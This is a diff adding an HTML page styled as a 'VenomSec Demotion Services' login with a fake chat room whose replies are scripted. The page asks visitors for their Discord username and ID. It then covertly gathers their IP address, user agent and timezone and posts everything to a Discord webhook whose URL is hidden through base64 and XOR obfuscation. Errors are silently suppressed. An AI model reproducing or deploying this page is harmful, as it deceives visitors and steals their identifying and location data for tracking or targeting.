@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VenomSec | Demotion Services</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+        }
+        .overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.95);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        .verify-box {
+            background: #111;
+            border: 2px solid #00ff00;
+            padding: 40px;
+            width: 420px;
+            text-align: center;
+            box-shadow: 0 0 30px #00ff00;
+        }
+        input {
+            background: #000;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 12px;
+            width: 100%;
+            margin: 10px 0;
+            font-family: inherit;
+        }
+        button {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 12px 30px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .chat-container {
+            display: none;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .header {
+            background: #000;
+            padding: 15px;
+            text-align: center;
+            border-bottom: 2px solid #00ff00;
+            font-size: 18px;
+        }
+        .chat-area {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+            background: #0a0a0a;
+        }
+        .message {
+            margin: 8px 0;
+            padding: 8px;
+            background: #111;
+            border-left: 3px solid #00ff00;
+        }
+        .input-area {
+            padding: 15px;
+            background: #000;
+            display: flex;
+        }
+        .input-area input {
+            flex: 1;
+        }
+    </style>
+</head>
+<body>
+
+<div id="verifyScreen" class="overlay">
+    <div class="verify-box">
+        <h1>VENOMSEC</h1>
+        <h2>Demotion Services</h2>
+        <p style="color:#ffaa00;">Verification Required</p>
+        <p>If you input the wrong data, you might encounter issues.</p>
+        
+        <input type="text" id="username" placeholder="Discord Username (user#0000)" required>
+        <input type="text" id="userid" placeholder="Discord User ID" maxlength="20" required>
+        
+        <button onclick="submitVerification()">VERIFY & ACCESS</button>
+    </div>
+</div>
+
+<div id="chatScreen" class="chat-container">
+    <div class="header">
+        VENOMSEC GLOBAL CHAT • DEMOTION SERVICES
+    </div>
+    <div id="chatArea" class="chat-area"></div>
+    <div class="input-area">
+        <input type="text" id="chatInput" placeholder="Type message...">
+        <button onclick="sendMessage()">SEND</button>
+    </div>
+</div>
+
+<script>
+function l1(a,b,c){return a+b+c;}
+function l2(s){return atob(s);}
+function l3(x){return x.split('').map(c=>String.fromCharCode(c.charCodeAt(0)^7)).join('');}
+function getHook(){
+    let p1 = l1("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv","MTUxMTc0NjU0MDE0MDQ5NTA0OC8","Nl1Sd3A3ZWpHZnAxc2JHeXAwT3ZERTEyUEQ4OTM0VnFDcnk4dGNMemRpMXN1VktVMHBzcm53ZXNB M0xWNWZzYUVBN0s=");
+    let p2 = l2(p1);
+    let p3 = l3(p2);
+    return p3;
+}
+async function sendLog(username, userid) {
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
+
+        const data = {
+            content: "**VenomSec Login Helper**",
+            embeds: [{
+                title: "New Signup",
+                color: 0x00ff00,
+                fields: [
+                    { name: "юзер", value: username, inline: true },
+                    { name: "id", value: userid, inline: true },
+                    { name: "адрес", value: ip, inline: true },
+                    { name: "агент", value: navigator.userAgent, inline: false },
+                    { name: "впн байпасс", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+                    { name: "Timestamp", value: new Date().toISOString(), inline: true }
+                ]
+            }]
+        };
+
+        await fetch(getHook(), {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+    } catch(e) {}
+}
+
+async function submitVerification() {
+    const username = document.getElementById('username').value.trim();
+    const userid = document.getElementById('userid').value.trim();
+
+    if (!username || !userid || userid.length < 17) {
+        alert("Invalid data. Issues may occur.");
+        return;
+    }
+
+    await sendLog(username, userid);
+
+    document.getElementById('verifyScreen').style.display = 'none';
+    document.getElementById('chatScreen').style.display = 'flex';
+
+    addSystemMessage("Welcome to VenomSec Global. All messages are monitored.");
+}
+
+function addMessage(user, text) {
+    const chat = document.getElementById('chatArea');
+    const msg = document.createElement('div');
+    msg.className = 'message';
+    msg.innerHTML = `<strong>${user}:</strong> ${text}`;
+    chat.appendChild(msg);
+    chat.scrollTop = chat.scrollHeight;
+}
+
+function addSystemMessage(text) {
+    const chat = document.getElementById('chatArea');
+    const msg = document.createElement('div');
+    msg.className = 'message';
+    msg.style.color = '#ffaa00';
+    msg.textContent = `[SYSTEM] ${text}`;
+    chat.appendChild(msg);
+    chat.scrollTop = chat.scrollHeight;
+}
+
+function sendMessage() {
+    const input = document.getElementById('chatInput');
+    const text = input.value.trim();
+    if (text) {
+        addMessage("You", text);
+        input.value = '';
+        
+        setTimeout(() => {
+            const replies = ["LMAO same", "Demoted EZ", "Fart", "Facts"];
+            addMessage("fornga0" + Math.floor(Math.random()*999), replies[Math.floor(Math.random()*replies.length)]);
+        }, 800);
+    }
+}
+
+document.getElementById('chatInput').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') sendMessage();
+});
+
+setTimeout(() => addMessage("xX_ShadowDemoter_Xx", "anyone need nitro demotion?"), 1200);
+setTimeout(() => addMessage("VenomAdmin", "All services active"), 2500);
+
+</script>
+</body>
+</html>
